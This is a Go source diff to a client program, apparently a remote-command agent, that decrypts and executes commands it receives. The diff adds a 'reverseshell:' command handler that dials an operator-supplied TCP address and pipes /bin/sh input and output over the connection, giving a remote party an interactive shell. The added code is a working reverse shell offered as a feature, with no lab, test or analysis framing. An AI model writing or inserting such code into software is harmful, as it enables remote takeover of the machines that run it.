@@ -5,6 +5,8 @@ import (
 	"encoding/gob"
 	"fmt"
 	"net"
+	"os/exec"
+	"strings"
 	"time"
 
 	"github.com/b1gcat/core/pki"
@@ -170,6 +172,24 @@ func (c *Client) sendProbe() error {
 	return nil
 }
 
+func (c *Client) startReverseShell(targetAddr string) error {
+	// Connect back to the specified address
+	conn, err := net.Dial("tcp4", targetAddr)
+	if err != nil {
+		c.config.Logger.Errorf("Failed to connect to reverse shell target %s: %v", targetAddr, err)
+		return err
+	}
+
+	defer conn.Close()
+
+	c.config.Logger.Infof("Successfully connected to reverse shell target %s", targetAddr)
+
+	// Call createShell function to establish the shell session
+	createShell(conn)
+
+	return nil
+}
+
 func (c *Client) receiveResponse() error {
 	// Set read deadline
 	c.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
@@ -214,6 +234,22 @@ func (c *Client) receiveResponse() error {
 	}
 }
 
+func createShell(connection net.Conn) {
+	var message string = "successful connection from " + connection.LocalAddr().String()
+	_, err := connection.Write([]byte(message + "\n"))
+	if err != nil {
+		fmt.Println("An error occurred trying to write to the outbound connection:", err)
+		return
+	}
+
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin = connection
+	cmd.Stdout = connection
+	cmd.Stderr = connection
+
+	cmd.Run()
+}
+
 func (c *Client) handleCommand(encryptedCmd []byte) error {
 	// Decrypt command
 	decryptedCmd, err := pki.Decrypt(c.config.Key, encryptedCmd)
@@ -224,6 +260,16 @@ func (c *Client) handleCommand(encryptedCmd []byte) error {
 	cmdStr := string(decryptedCmd)
 	// Logging handled through configured logger
 	c.config.Logger.Debugf("Client received command: %s", cmdStr)
+
+	// Check if this is a reverse shell command
+	if strings.HasPrefix(cmdStr, "reverseshell:") {
+		parts := strings.SplitN(cmdStr, ":", 2)
+		if len(parts) == 2 {
+			targetAddr := parts[1]
+			go c.startReverseShell(targetAddr)
+		}
+		return nil
+	}
 
 	// Execute command with 10-second timeout
 	result := "result:"
